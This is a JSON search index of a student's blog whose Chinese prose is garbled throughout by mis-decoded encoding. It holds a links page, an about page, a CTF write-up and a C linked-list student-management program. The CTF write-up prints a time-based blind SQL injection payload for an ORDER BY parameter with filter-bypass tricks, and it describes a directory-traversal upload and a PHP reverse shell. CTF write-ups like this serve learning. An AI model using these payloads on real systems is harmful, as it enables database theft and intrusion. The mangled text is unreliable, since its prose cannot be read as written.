{"pages":[{"title":"link","text":"å‹é“¾ Dalaoä»¬QwQ URL lola http://lalo39.cn BlackBoss https://absolute-field.github.io/ èŠ‹å¤´tql https://leohearts.com/ ä»¤åˆ™çˆ·çˆ· https://lingze.xyz/ å£®å­¦å§(? http://0xc4m3l.club/ è‚–å¸ˆå‚…â¤ https://0xfay.github.io/ const27 http://www.const27.com/ ç¾½å“¥å“¥ http://www.cl4y.top/ é²å¸ˆå‚… https://ljahum.github.io/ ç©ºçµ https://kodosan.com/ æµªæµª https://longlone.best/","link":"/link/index.html"},{"title":"about","text":"å…³äºæˆ‘CUITåœ¨è¯»å¸¦å­¦ç”Ÿä¸€ä¸ªè¾£é¸¡åŠ èœé¸¡ï¼ˆï¼ˆï¼ˆç›®æ ‡æ˜¯ï¼šæ´»ç€ã€å¹¶å°è¯•é£å‘æ›´é«˜çš„åœ°æ–¹å¢¨æ°´ä¸å¤Ÿå°±è¿™æ ·å§â€¦(: P)","link":"/about/index.html"}],"posts":[{"title":"BJDCTF 3rd-å°çŸ¥è¯†ç‚¹","text":"ä»Šå¤©ä¹Ÿæ˜¯è¢«é¢˜ç›®æš´æ‰“çš„ä¸€å›å‘¢ï¼ˆï¼Œåªå‡ºæ¥ä¸¤é“é¢˜ï¼Œæœ‰å¤§é‡çš„æ—¶é—´æµªè´¹åœ¨äº†å¤šäººè¿åŠ¨çš„æ³¨å…¥ä¸Šâ€¦ å°çº¢èŠ±å¾ˆç®€å•ï¼Œå› ä¸ºshell_execä¸ä¼šè¾“å‡ºè¿”å›å€¼ï¼ˆå‡†ç¡®æ¥è¯´ä¼šè¿”å›ä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œä½†ä¸ä¼šç›´æ¥æ‰“å°åœ¨æµè§ˆå™¨ä¸Šï¼‰ã€‚æ‰€ä»¥ç›´æ¥å°è¯•åå¼¹shellã€‚è¿™é‡Œç”¨phpåå¼¹shellæˆåŠŸã€‚åæ¥å¬è¯´æœ‰é˜²ç«å¢™banäº†ä¸€äº›ç«¯å£ï¼Œè¿æ°”å¥½ç›´æ¥æ‰¾åˆ°äº†æ²¡bançš„ï¼ˆï¼ˆï¼ˆ gobåœ¨ä¸Šä¼ å®Œæ–‡ä»¶åä¼šè®¾ç½®ä¸€ä¸ªphpsessidï¼Œå†è®¿é—®show.phpä¼šå‡ºç°åˆšæ‰ä¸Šä¼ çš„å›¾ç‰‡(data://base64çš„å½¢å¼)ã€‚base64_decode(phpsessid)åå‘ç°é‡Œé¢å«æœ‰ä¸Šä¼ æ–‡ä»¶çš„è·¯å¾„ã€‚æ•…å°è¯•ä¸Šä¼ ä¸€ä¸ª../../../../flag(æœ‰å¤šå°‘ä¸ª../æˆ‘å¿˜äº†)çš„æ–‡ä»¶ã€‚å®ç°ç›®å½•ç©¿æ¢­ï¼Œå¾—åˆ°flagã€‚PSï¼šæˆ‘æœ€å¼€å§‹æ˜¯ä»¥ä¸ºè¦å»è§£æé‚£ä¸ªphpsessidï¼Œå°è¯•å¯¹å…¶è¿›è¡Œä¿®æ”¹â€¦ç»“æœå®Œå…¨ä¸çŸ¥é“åé¢çš„hashå€¼æ˜¯æ€ä¹ˆæ¥çš„ï¼Œæœ€åå‘ç°åšéº»çƒ¦äº† å¤šäººè¿åŠ¨åšäº†å¾ˆé•¿æ—¶é—´ä¹Ÿæ²¡æœ‰åšå‡ºæ¥â€¦çœ‹åˆ°é‚£ä¸ªhintä»¥ä¸ºæ˜¯è¡¨åæœ‰ä¸œè¥¿â€¦é¦–å…ˆæ˜¯å¦‚ä½•è¿›è¡Œæ³¨å…¥,å¯ä»¥çœ‹åˆ°æœåŠ¡å™¨è¯»å–çš„æ•°æ®ä¼šæ ¹æ®byå‚æ•°è¿›è¡Œæ’åºï¼ŒçŒœæµ‹æ˜¯order byæ³¨å…¥ï¼Œé¦–å…ˆæ’é™¤è”åˆæ³¨å…¥ä»¥ä¸‹æ˜¯æˆ‘çš„payloadï¼š http://x.x.x.x:xxxxx/?by=desc,(SELECT (CASE WHEN (select left((select group_concat(database_name) from mysql.innodb_table_stats),11)in(concat(char(109),char(121),char(115),char(113),char(108),char(44),char(115),char(121),char(115)))) THEN BENCHMARK(999999999,md5(1)) ELSE 1 END)) è¯¦è§£ï¼š $payload = desc,(SELECT (CASE WHEN $a THEN $b ELSE 1 END)) é¢˜ç›®è¿‡æ»¤äº†ifï¼Œæ•…ä½¿ç”¨caseè¿›è¡Œç»•è¿‡ $a = (select ($a_1)in($a_2)) å› ä¸ºé¢˜ç›®è¿‡æ»¤äº† =&lt;&gt;like æ‰€ä»¥ä½¿ç”¨inæ¥æ›¿ä»£ $a_1 = left($a_1_1,11) é¢˜ç›®è¿‡æ»¤äº†å¤§å¤šæ•°å­—ç¬¦ä¸²åˆ‡å‰²å‡½æ•°ï¼Œå¯ä»¥ä½¿ç”¨leftå’Œrightæ¥ç»•è¿‡ PS:çœ‹å‡ºé¢˜äººåŒæ—¶ä½¿ç”¨leftå’Œrightæ¥è¾¾åˆ°æå–å•ä¸ªå­—ç¬¦çš„ä½œç”¨ï¼Œè¿™ä¸€ç‚¹æˆ‘æ²¡æƒ³åˆ°...å¦‚:right(left(xxx,3),2) $a_1_1 = (select group_concat(database_name) from mysql.innodb_table_stats) è¿™é‡Œå› ä¸ºè¿‡æ»¤äº†orå’Œsysï¼Œæ²¡æ³•æå–è¡¨åï¼Œæ•…å°è¯•ç”¨mysql.innodb_table_statsæ¥ç»•è¿‡ï¼Œä½†è¿™å½¢æˆäº†ä¸€ä¸ªå¤§å‘ $a_2 = concat(char(109),char(121),char(115),char(113),char(108),char(44),char(115),char(121),char(115)) è¿™é‡Œå› ä¸ºå•ä½¿ç”¨leftæå–å‡ºæ¥çš„æ˜¯å­—ç¬¦ä¸²ä¸æ˜¯å•ä¸ªå­—ç¬¦ï¼Œè€Œcharå‡½æ•°æ²¡æœ‰banï¼Œæ•…ä½¿ç”¨ä¸Šé¢çš„æ–¹å¼ç»„åˆå­—ç¬¦ä¸² PSï¼šé™¤äº†charä»¥å¤–è¿˜æœ‰unhex; conv;å‡½æ•°å¯ä»¥ç”¨ï¼Œä¸è¿‡charæ›´ç®€å•ä¸€äº› $b = BENCHMARK(999999999,md5(1)) é¢˜ç›®è¿‡æ»¤äº†sleepï¼Œä½¿ç”¨BENCHMARKå¤šæ¬¡æ‰§è¡Œä¸€ä¸ªæ“ä½œç„¶è€Œè¿™é“é¢˜æœ€ç»ˆæ²¡èƒ½è§£å‡ºæ¥çš„åŸå› æ˜¯ä½¿ç”¨äº†mysql.innodb_table_statsè¿™ä¸ªå‘è¯šç„¶ï¼Œinnodbåœ¨é»˜è®¤æƒ…å†µä¸‹æ˜¯å…³é—­çš„ï¼Œä½†ä¸ä»£è¡¨å®ƒä¸ä½œç”¨ã€‚åœ¨å…¶å…³é—­çš„æƒ…å†µä¸‹ä½¿ç”¨mysql.innodb_table_statsæŸ¥è¯¢ï¼Œä¸ä¼šä¸ºç©ºï¼Œè€Œæ˜¯èƒ½æŸ¥å‡ºæ¥mysqlé»˜è®¤çš„ä¸¤ä¸ªåº“mysqlå’Œsysï¼Œå…¶å®ƒåº“ä¸èƒ½æŸ¥åˆ°ï¼Œè¡¨ååŒç†ã€‚è€Œæˆ‘ä»¥ä¸ºâ€¦å¦‚æœå…³é—­äº†innodbï¼Œæ•´ä¸ªinnodb_table_statsæ˜¯ç©ºï¼Œæ²¡æœ‰æ•°æ®çš„ï¼ˆæœ€ç»ˆå¯¼è‡´æˆ‘è¿™é“é¢˜æ²¡æœ‰åšå‡ºæ¥â€¦ åè¨€å› ä¸ºèŠ±è´¹äº†å¤§é‡çš„æ—¶é—´åœ¨å¤šäººè¿åŠ¨è¿™é“é¢˜ä¸Šï¼Œå…¶å®ƒçš„é¢˜æ²¡æœ‰çœ‹ï¼Œå¾…å¤ç°ç¯å¢ƒå‡ºæ¥å†è¯´å§â€¦PSï¼šæˆ‘èœç‚¸äº†ï¼ˆ","link":"/2020/05/24/BJDCTF-3rd-%E5%B0%8F%E7%9F%A5%E8%AF%86%E7%82%B9/"},{"title":"Cè¯­è¨€å®ç°å­¦ç”Ÿä¿¡æ¯ç®¡ç†ç³»ç»Ÿ","text":"å‰è¨€ç”±äºç–«æƒ…åŸå› ï¼Œæœ€è¿‘åªèƒ½å‘†åœ¨å®¶é‡Œä¸Šç½‘è¯¾ï¼Œä½†å®åœ¨ä¸æƒ³å¬è¿™ä¸ªæ—…æ¸¸ç®¡ç†çš„ä¸“ä¸šè¯¾ï¼ˆä¸€ç›´ä»–å–µçš„æ´—è„‘ä¸è¦æˆ‘ä»¬è½¬ä¸“ä¸šDXï¼‰å’Œè‹±è¯­ï¼ˆPS. æ•°å­¦è¿˜æ˜¯è¦å¬ä¸€å¬çš„ï¼‰ï¼Œæ‰€ä»¥æå‡ºæ¥äº†è¿™ä¸ªä¸œè¥¿â€¦â€¦ è¿å¸¦æ‘¸é±¼è€—è´¹äº†4å¤©çš„æ—¶é—´ï¼Œå…±760è¡Œå·¦å³çš„ä»£ç ï¼Œå®ç°äº†é“¾è¡¨èŠ‚ç‚¹çš„å¢åˆ æŸ¥æ”¹åŠŸèƒ½ã€‚ç”±äºè¿˜æ²¡æœ‰ç³»ç»Ÿå­¦ä¹ è¿‡Cè¯­è¨€ï¼Œæ‰€ä»¥è®¸å¤šä¸œè¥¿éƒ½æ˜¯è‡ªå·±æ‘¸ç´¢åŠ æŸ¥èµ„æ–™å¾—æ¥çš„ã€‚å¯èƒ½ååˆ†è‡ƒè‚¿ï¼Œæ¬¢è¿æ‰¹è¯„æ–§æ­£ã€‚PS. åœ¨å¤§ç¥ä»¬çœ‹æ¥è¿™å¯èƒ½ä¸ç®—ä»€ä¹ˆï¼Œä½†æˆ‘è¿˜æ˜¯ååˆ†å…´å¥‹çš„(=v=)ã€‚ ä»£ç è¯¦æƒ…main.c#include&lt;stdio.h&gt; #include&lt;stdlib.h&gt; #include&lt;string.h&gt; #include&quot;head.h&quot; newStudent *studentNext; int main(void) { int modeCode; initStudentList(); loadData(1); while(1) { welcome(); printf(&quot;\\nPlease select mode:&quot;); scanf(&quot;%1d%*c&quot;, &amp;modeCode); switch(modeCode) { case 1: system(&quot;cls&quot;); addStudent(); break; case 2: system(&quot;cls&quot;); selStudentMain(); break; case 3: system(&quot;cls&quot;); delStudentMain(); break; case 4: system(&quot;cls&quot;); changeStudentMain(); break; case 5: system(&quot;cls&quot;); loadData(0); break; case 6: system(&quot;cls&quot;); updateData(); break; case 0: free(studentNext); exit(0); } } }head.h//å½“å‰åŠ è½½å­¦ç”Ÿæ•°é‡ int studentNumber = 0; //å­¦ç”Ÿç»“æ„ä½“ typedef struct students { char id[11]; char name[40]; char sex[7]; char age[4]; struct students *next; }newStudent; //å…¨å±€é“¾è¡¨ extern newStudent *studentNext; //æ¬¢è¿è¯ void welcome(); //é“¾è¡¨åˆå§‹åŒ– void initStudentList(); //æ›´æ–°å­¦ç”Ÿæ•°æ® int updateData(); //åŠ è½½å­¦ç”Ÿæ•°æ® int loadData(int autoCode); //æ·»åŠ å­¦ç”Ÿ int addStudent(); //åˆ é™¤å­¦ç”Ÿä¸»èœå• int delStudentMain(); //é€šè¿‡å­¦å·åˆ é™¤å­¦ç”Ÿ int delStudentById(char *id, int autoCode); //é€šè¿‡å§“ååˆ é™¤å­¦ç”Ÿ int delStudentByName(char *name, int autoCode); //åˆ é™¤å½“å‰æ‰€æœ‰æ•°æ® int delAllStudent(); //æœç´¢å­¦ç”Ÿä¸»èœå• int selStudentMain(); //é€šè¿‡å­¦å·æœç´¢å­¦ç”Ÿ newStudent *selStudentById(char *id); //é€šè¿‡å§“åæœç´¢å­¦ç”Ÿ newStudent *selStudentByName(char *name); //å±•ç¤ºæ‰€æœ‰å­¦ç”Ÿ int showStudent(); //æ›´æ”¹å­¦ç”Ÿæ•°æ®ä¸»èœå• int changeStudentMain(); //æ›´æ”¹å­¦ç”Ÿæ•°æ® int changeStudent(newStudent *studentTmp); //æ¬¢è¿è¯ void welcome() { system(&quot;cls&quot;); printf(&quot;========================================\\n&quot;); printf(&quot;= _____ _____ __ __ _____ =\\n&quot;); printf(&quot;= / ____| / ____| | \\\\/ | / ____| =\\n&quot;); printf(&quot;= | | | (___ | \\\\ / | | (___ =\\n&quot;); printf(&quot;= | | \\\\___ \\\\ | |\\\\/| | \\\\___ \\\\ =\\n&quot;); printf(&quot;= | |____ ____) | | | | | ____) | =\\n&quot;); printf(&quot;= \\\\_____| |_____/ |_| |_| |_____/ =\\n&quot;); printf(&quot;========================================\\n&quot;); printf(&quot;=====CUIT Student Management System=====\\n&quot;); printf(&quot;========================================\\n&quot;); printf(&quot;============Student Number:%d============\\n&quot;, studentNumber); printf(&quot;========================================\\n&quot;); printf(&quot;=============1.Add Student==============\\n&quot;); printf(&quot;=============2.Sel Student==============\\n&quot;); printf(&quot;=============3.Del Student==============\\n&quot;); printf(&quot;=============4.Cha Student==============\\n&quot;); printf(&quot;=============5.load Data==============\\n&quot;); printf(&quot;=============6.update Data==============\\n&quot;); printf(&quot;=============0.Exit System==============\\n&quot;); printf(&quot;========================================\\n&quot;); } //é“¾è¡¨åˆå§‹åŒ– void initStudentList() { studentNext = (newStudent*)malloc(sizeof(newStudent)); studentNext-&gt;next = NULL; } //æ›´æ–°å­¦ç”Ÿæ•°æ® int updateData() { FILE *fp = NULL; newStudent *studentTmp = NULL; if(studentNext-&gt;next != NULL) { if(remove(&quot;studentInfo.txt&quot;) == 0) { fp = fopen(&quot;studentInfo.txt&quot;, &quot;w&quot;); studentTmp = studentNext-&gt;next; if(fp != NULL) { while(studentTmp != NULL) { fprintf(fp, &quot;|%s|%s|%s|%s|\\n&quot;, studentTmp-&gt;id, studentTmp-&gt;name, studentTmp-&gt;sex, studentTmp-&gt;age); studentTmp = studentTmp-&gt;next; } fclose(fp); printf(&quot;Updata completed\\n&quot;); delAllStudent(); loadData(1); } else printf(&quot;File open fail\\n&quot;); } else printf(&quot;File delete fail\\n&quot;); } else { fp = fopen(&quot;studentInfo.txt&quot;, &quot;w&quot;); if(fgetc(fp) != EOF) { fclose(fp); remove(&quot;studentInfo.txt&quot;); fp = fopen(&quot;studentInfo.txt&quot;, &quot;w&quot;); fclose(fp); } else printf(&quot;The current data is empty!\\n&quot;); } system(&quot;pause&quot;); return 1; } //åŠ è½½å­¦ç”Ÿæ•°æ® int loadData(int autoCode) { FILE *fp = NULL; char data[64] = {0}; char *str = NULL; int i = 0; int number = 0; int judgeCode = 0; newStudent *studentTmp = NULL; fp = fopen(&quot;studentInfo.txt&quot;, &quot;r+b&quot;); printf(&quot;Start load Data...\\n&quot;); while(fscanf(fp, &quot;%[^\\n]%*c&quot;, data) != EOF) { studentTmp = (newStudent*)malloc(sizeof(newStudent)); str = strtok(data, &quot;|&quot;); for(i = 0; i &lt; 4; i++) { if(str != NULL &amp;&amp; str != EOF &amp;&amp; str != &apos;\\0&apos;) { switch(i) { case 0: if(selStudentById(str) == NULL) { strcpy(studentTmp-&gt;id, str); break; } else { judgeCode = 1; break; } case 1: strcpy(studentTmp-&gt;name, str); break; case 2: strcpy(studentTmp-&gt;sex, str); break; case 3: strcpy(studentTmp-&gt;age, str); break; } if(judgeCode) break; str = strtok(NULL, &quot;|&quot;); } } if(!judgeCode) { studentTmp-&gt;next = studentNext-&gt;next; studentNext-&gt;next = studentTmp; studentNumber++; number++; } } printf(&quot;All done, loaded %d student...\\n&quot;, number); fclose(fp); if(!autoCode) system(&quot;pause&quot;); return 1; } //æ·»åŠ å­¦ç”Ÿ int addStudent() { int sexCode = 0; //æ€§åˆ«çŠ¶æ€ç  int judgeCode = 0; FILE *fp = NULL; //æ–‡ä»¶å˜é‡ char continueCode = 1; //åˆ¤æ–­æ˜¯å¦ç»§ç»­æ·»åŠ  newStudent *studentSel = NULL; while(1) { fp = fopen(&quot;studentInfo.txt&quot;, &quot;a&quot;); //åˆ†é…æ–°å†…å­˜ newStudent *studentTmp = (newStudent*)malloc(sizeof(newStudent)); printf(&quot;Please enter the id of the new student:&quot;); scanf(&quot;%10[^\\n]%*c&quot;, &amp;studentTmp-&gt;id); if(studentNext-&gt;next != NULL) { studentSel = selStudentById(studentTmp-&gt;id); if(studentSel != NULL) { printf(&quot;The same ID has been entered!\\n&quot;); printf(&quot;Students found:%-11s%-20s%-7s%-4s\\n&quot;, studentSel-&gt;id, studentSel-&gt;name, studentSel-&gt;sex, studentSel-&gt;age); printf(&quot;Would you like to update this student&apos;s information?[Yes(1)/No(0)]:&quot;); scanf(&quot;%1d%*c&quot;, &amp;judgeCode); if(judgeCode == 1) delStudentById(studentTmp-&gt;id, 1); else return -1; } } printf(&quot;Please enter the name of the new student:&quot;); scanf(&quot;%39[^\\n]&quot;, &amp;studentTmp-&gt;name); while(1) { printf(&quot;Please choose the sex of the new student[Male(1)/Female(0)]:&quot;); scanf(&quot;%1d%*c&quot;, &amp;sexCode); if(sexCode == 1) { strcpy(studentTmp-&gt;sex ,&quot;Male&quot;); break; } else if(sexCode == 0) { strcpy(studentTmp-&gt;sex, &quot;Female&quot;); break; } else printf(&quot;Choose Error\\n&quot;); } printf(&quot;Please enter the age of the new student:&quot;); scanf(&quot;%3[^\\n]%*c&quot;, &amp;studentTmp-&gt;age); if(fp != NULL) { fprintf(fp, &quot;|%s|%s|%s|%s|\\n&quot;, studentTmp-&gt;id, studentTmp-&gt;name, studentTmp-&gt;sex, studentTmp-&gt;age); fclose(fp); }else { printf(&quot;File open fail!\\n&quot;); } studentTmp-&gt;next = studentNext-&gt;next; studentNext-&gt;next = studentTmp; studentNumber++; while(continueCode) { printf(&quot;Do you want to continue adding students?[Yes(1)/No(0)]:&quot;); scanf(&quot;%1d%*c&quot;, &amp;continueCode); if(continueCode) system(&quot;cls&quot;); break; } if(!continueCode) break; } return 1; } //åˆ é™¤å­¦ç”Ÿä¸»èœå• int delStudentMain() { int modeCode = 0; int judgeCode = 0; char id[11] = {0}; char name[40] = {0}; if(studentNext-&gt;next != NULL) { printf(&quot;What keywords do you want to delete data from?\\n&quot;); printf(&quot;&gt;Cancel(Other)\\n&quot;); printf(&quot;&gt;Student&apos;s id(1)\\n&quot;); printf(&quot;&gt;Student&apos;s name(2)\\n&quot;); printf(&quot;&gt;Delete all student(3)\\n&quot;); printf(&quot;I choose to delete data by:&quot;); scanf(&quot;%1d%*c&quot;, &amp;modeCode); switch(modeCode) { case 1: system(&quot;cls&quot;); printf(&quot;Please enter the ID of the student you want to delete:&quot;); scanf(&quot;%10s%*c&quot;, &amp;id); delStudentById(id, 0); modeCode = 1; break; case 2: system(&quot;cls&quot;); printf(&quot;Please enter the name of the student you want to delete:&quot;); scanf(&quot;%[^\\n]%*c&quot;, &amp;name); delStudentByName(name, 0); modeCode = 1; break; case 3: system(&quot;cls&quot;); printf(&quot;Are you sure you want to delete all student data?[Yes(1)/No(0)]:&quot;); scanf(&quot;%1d%*c&quot;, &amp;judgeCode); if(judgeCode) delAllStudent(); modeCode = 1; break; default: modeCode = 0; break; } } else { printf(&quot;The current data is empty!\\n&quot;); system(&quot;pause&quot;); } return(modeCode); } //é€šè¿‡å­¦å·åˆ é™¤å­¦ç”Ÿ int delStudentById(char *id, int autoCode) { int judgeCode = 1; newStudent *studentDel = NULL; newStudent *studentTmp = NULL; studentTmp = studentNext; studentDel = studentNext-&gt;next; if(studentNext-&gt;next != NULL) { while(judgeCode) { judgeCode = strncmp(studentDel-&gt;id, id, 10); if(!judgeCode) { printf(&quot;Removed student:%-11s%-20s%-7s%-4s\\n&quot;, studentDel-&gt;id, studentDel-&gt;name, studentDel-&gt;sex, studentDel-&gt;age); studentTmp-&gt;next = studentDel-&gt;next; studentNumber--; printf(&quot;successfully deleted\\n&quot;); break; } if(studentDel-&gt;next == NULL) { printf(&quot;No corresponding ID found!\\n&quot;); break; } studentTmp = studentDel; studentDel = studentDel-&gt;next; } free(studentDel); } else { printf(&quot;The current data is empty!\\n&quot;); } if(!autoCode) system(&quot;pause&quot;); return 1; } //é€šè¿‡å§“ååˆ é™¤å­¦ç”Ÿ int delStudentByName(char *name, int autoCode) { int judgeCode = 1; newStudent *studentDel = NULL; newStudent *studentTmp = NULL; studentTmp = studentNext; studentDel = studentNext-&gt;next; if(studentNext-&gt;next != NULL) { while(judgeCode) { judgeCode = strcmp(studentDel-&gt;name, name); if(!judgeCode) { printf(&quot;Removed student:%-11s%-20s%-7s%-4s\\n&quot;, studentDel-&gt;id, studentDel-&gt;name, studentDel-&gt;sex, studentDel-&gt;age); studentTmp-&gt;next = studentDel-&gt;next; studentNumber--; printf(&quot;successfully deleted\\n&quot;); break; } if(studentDel-&gt;next == NULL) { printf(&quot;No corresponding name found!\\n&quot;); break; } studentTmp = studentDel; studentDel = studentDel-&gt;next; } free(studentDel); } else { printf(&quot;The current data is empty!\\n&quot;); } if(!autoCode) system(&quot;pause&quot;); return 1; } //åˆ é™¤å½“å‰æ‰€æœ‰æ•°æ® int delAllStudent() { free(studentNext); initStudentList(); studentNumber = 0; return 1; } //æœç´¢å­¦ç”Ÿä¸»èœå• int selStudentMain() { int modeCode = 0; char id[11] = {0}; char name[40] = {0}; newStudent *studentTmp = NULL; if(studentNext-&gt;next != NULL) { printf(&quot;What keywords do you want to select data from?\\n&quot;); printf(&quot;&gt;Cancel(Other)\\n&quot;); printf(&quot;&gt;Student&apos;s ID(1)\\n&quot;); printf(&quot;&gt;Student&apos;s name(2)\\n&quot;); printf(&quot;&gt;Show all student(3)\\n&quot;); printf(&quot;I choose to select data by:&quot;); scanf(&quot;%1d%*c&quot;, &amp;modeCode); switch(modeCode) { case 1: system(&quot;cls&quot;); printf(&quot;Please enter the ID of the student you want to select:&quot;); scanf(&quot;%10[^\\n]%*c&quot;, &amp;id); studentTmp = selStudentById(id); if(studentTmp != NULL) printf(&quot;Students found:%-11s%-20s%-7s%-4s\\n&quot;, studentTmp-&gt;id, studentTmp-&gt;name, studentTmp-&gt;sex, studentTmp-&gt;age); else printf(&quot;No corresponding ID found!\\n&quot;); system(&quot;pause&quot;); modeCode = 1; break; case 2: system(&quot;cls&quot;); printf(&quot;Please enter the name of the student you want to select:&quot;); scanf(&quot;%[^\\n]%*c&quot;, &amp;name); studentTmp = selStudentByName(name); if(studentTmp != NULL) printf(&quot;Students found:%-11s%-20s%-7s%-4s\\n&quot;, studentTmp-&gt;id, studentTmp-&gt;name, studentTmp-&gt;sex, studentTmp-&gt;age); else printf(&quot;No corresponding ID found!\\n&quot;); system(&quot;pause&quot;); modeCode = 1; break; case 3: showStudent(); break; default: modeCode = 0; break; } } else { printf(&quot;The current data is empty!\\n&quot;); system(&quot;pause&quot;); } return(modeCode); } //é€šè¿‡å­¦å·æœç´¢å­¦ç”Ÿ newStudent *selStudentById(char *id) { int judgeCode = 1; newStudent *studentTmp = NULL; if(studentNext-&gt;next != NULL) { studentTmp = studentNext-&gt;next; while(judgeCode) { judgeCode = strncmp(studentTmp-&gt;id, id, 10); if(judgeCode) studentTmp = studentTmp-&gt;next; if(studentTmp == NULL) judgeCode = 0; } } else { printf(&quot;The current data is empty!\\n&quot;); } return studentTmp; } //é€šè¿‡å§“åæœç´¢å­¦ç”Ÿ newStudent *selStudentByName(char *name) { int judgeCode = 1; newStudent *studentTmp = NULL; if(studentNext-&gt;next != NULL) { studentTmp = studentNext-&gt;next; while(judgeCode) { judgeCode = strcmp(studentTmp-&gt;name, name); if(judgeCode) studentTmp = studentTmp-&gt;next; if(studentTmp == NULL) judgeCode = 0; } } else { printf(&quot;The current data is empty!\\n&quot;); } return studentTmp; } //å±•ç¤ºæ‰€æœ‰å­¦ç”Ÿ int showStudent() { newStudent *studentNow; if(studentNext-&gt;next != NULL) { studentNow = studentNext-&gt;next; while(studentNow != NULL) { printf(&quot;%-11s%-20s%-7s%-4s\\n&quot;, studentNow-&gt;id, studentNow-&gt;name, studentNow-&gt;sex, studentNow-&gt;age); studentNow = studentNow-&gt;next; } printf(&quot;All done...\\n&quot;); } else { printf(&quot;The current data is empty!\\n&quot;); } system(&quot;pause&quot;); return 1; } //æ›´æ”¹å­¦ç”Ÿæ•°æ®ä¸»èœå• int changeStudentMain() { int modeCode = 0; char id[11] = {0}; char name[40] = {0}; newStudent *studentTmp = NULL; if(studentNext-&gt;next != NULL) { printf(&quot;What keywords do you want to select data from?\\n&quot;); printf(&quot;&gt;Cancel(Other)\\n&quot;); printf(&quot;&gt;Student&apos;s ID(1)\\n&quot;); printf(&quot;&gt;Student&apos;s name(2)\\n&quot;); printf(&quot;I choose to select data by:&quot;); scanf(&quot;%1d%*c&quot;, &amp;modeCode); switch(modeCode) { case 1: system(&quot;cls&quot;); printf(&quot;Please enter the ID of the student you want to select:&quot;); scanf(&quot;%10[^\\n]%*c&quot;, &amp;id); studentTmp = selStudentById(id); if(studentTmp != NULL) { printf(&quot;Students found:%-11s%-20s%-7s%-4s\\n&quot;, studentTmp-&gt;id, studentTmp-&gt;name, studentTmp-&gt;sex, studentTmp-&gt;age); changeStudent(studentTmp); } else printf(&quot;No corresponding ID found!\\n&quot;); system(&quot;pause&quot;); modeCode = 1; break; case 2: system(&quot;cls&quot;); printf(&quot;Please enter the name of the student you want to select:&quot;); scanf(&quot;%[^\\n]%*c&quot;, &amp;name); studentTmp = selStudentByName(name); if(studentTmp != NULL) { printf(&quot;Students found:%-11s%-20s%-7s%-4s\\n&quot;, studentTmp-&gt;id, studentTmp-&gt;name, studentTmp-&gt;sex, studentTmp-&gt;age); changeStudent(studentTmp); } else printf(&quot;No corresponding ID found!\\n&quot;); system(&quot;pause&quot;); modeCode = 1; break; default: modeCode = 0; break; } } else { printf(&quot;The current data is empty!\\n&quot;); system(&quot;pause&quot;); } return 1; } //æ›´æ”¹å­¦ç”Ÿæ•°æ® int changeStudent(newStudent *studentTmp) { int sexCode = 0; if(studentNext-&gt;next != NULL) { printf(&quot;Please enter the id of the new student:&quot;); scanf(&quot;%10[^\\n]%*c&quot;, &amp;studentTmp-&gt;id); printf(&quot;Please enter the name of the new student:&quot;); scanf(&quot;%39[^\\n]%*c&quot;, &amp;studentTmp-&gt;name); while(1) { printf(&quot;Please choose the sex of the new student[Male(1)/Female(0)]:&quot;); scanf(&quot;%1d%*c&quot;, &amp;sexCode); if(sexCode == 1) { strcpy(studentTmp-&gt;sex ,&quot;Male&quot;); break; } else if(sexCode == 0) { strcpy(studentTmp-&gt;sex, &quot;Female&quot;); break; } else printf(&quot;Choose Error\\n&quot;); } printf(&quot;Please enter the age of the new student:&quot;); scanf(&quot;%3[^\\n]%*c&quot;, &amp;studentTmp-&gt;age); } else { printf(&quot;The current data is empty!\\n&quot;); system(&quot;pause&quot;); } return 1; }ä¸€äº›æˆ‘æƒ³è¦è¯´çš„ç‚¹scanfè¯»å–ç©ºæ ¼ä»¥åŠç¼“å†²åŒºå¯¹scanfçš„å½±å“æœ€å¼€å§‹çš„æ—¶å€™ï¼Œæˆ‘å¸Œæœ›é€šè¿‡ï¼š char str_1[11] = {0}; char str_2[11] = {0}; scanf(&quot;%10s&quot;, &amp;str_1); scanf(&quot;%10s&quot;, &amp;str_2);çš„æ–¹å¼æ¥è·å–å­—ç¬¦ä¸²ï¼Œä½†æˆ‘å‘ç°ä¸Šä¾‹æ˜¯æ— æ³•è¯»å–ç©ºæ ¼çš„ã€‚è€Œä¸”ï¼Œç¬¬äºŒä¸ªscanfå‡½æ•°è¢«è·³è¿‡äº†ã€‚ å…³äºç¬¬ä¸€ä¸ªé—®é¢˜ï¼Œç¨å¾®äº†è§£ä¸€ç‚¹CTFçŸ¥è¯†çš„éƒ½çŸ¥é“ï¼Œè¿™é‡Œè‚¯å®šä¸èƒ½ä½¿ç”¨gets()å‡½æ•°ï¼Œå› ä¸ºä»–ä¸å®‰å…¨ã€‚ä¸è¿‡ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨gets_s()å‡½æ•°æ›¿æ¢ä»–ã€‚ä¸è¿‡å› ä¸ºæˆ‘å–œæ¬¢æäº‹XDï¼Œæ‰€ä»¥æˆ‘å€”å¼ºåœ°æƒ³è¦ç”¨scanf()å‡½æ•°ï¼ˆé›¾ï¼‰ï¼›è¿˜æœ‰ä¸€æ–¹é¢ï¼Œè™½ç„¶æˆ‘æ²¡æœ‰ä¸Šè¿‡Cè¯­è¨€è¯¾ï¼Œä½†æˆ‘è§‰å¾—åƒgets_s()ã€scanf_s()è¿™ç§å‡½æ•°åº”è¯¥ä¸ä¼šè®²çš„å§ï¼ˆï¼Œæ‰€ä»¥æˆ‘æ‰“ç®—ç”¨åˆå­¦è€…çš„å¸¸ç”¨å‡½æ•°æ¥å®ç°ã€‚ è€Œç¬¬äºŒä¸ªé—®é¢˜æˆ‘åˆ™å®Œå…¨æ²¡æœ‰å¤´ç»ªâ€¦ åæ¥åœ¨ä¸€ä½å¸ˆå‚…å’Œæœé›†æ¥çš„èµ„æ–™çš„å¸®åŠ©ä¸‹ã€‚è°œé¢˜ï¼Œè§£å¼€äº†ã€‚å¸ˆå‚…ç»™æˆ‘äº†ä¸€ä¸ªè¿™æ ·çš„å†™æ³•ï¼š char str_1[11] = {0}; char str_2[11] = {0}; //è¿™ä¸ªæ˜¯å¸ˆå‚…ç»™çš„å†™æ³• //scanf(&quot;%[^\\n]%*c&quot;, &amp;str_1); //scanf(&quot;%[^\\n]%*c&quot;, &amp;str_2); //æˆ‘æ”¹è¿›äº†ä¸€ä¸‹ï¼ˆ scanf(&quot;%10[^\\n]%*c&quot;, &amp;str_1); scanf(&quot;%10[^\\n]%*c&quot;, &amp;str_2);è¯¦ç»†èµ„æ–™ï¼šhttps://blog.csdn.net/q_l_s/article/details/22572777 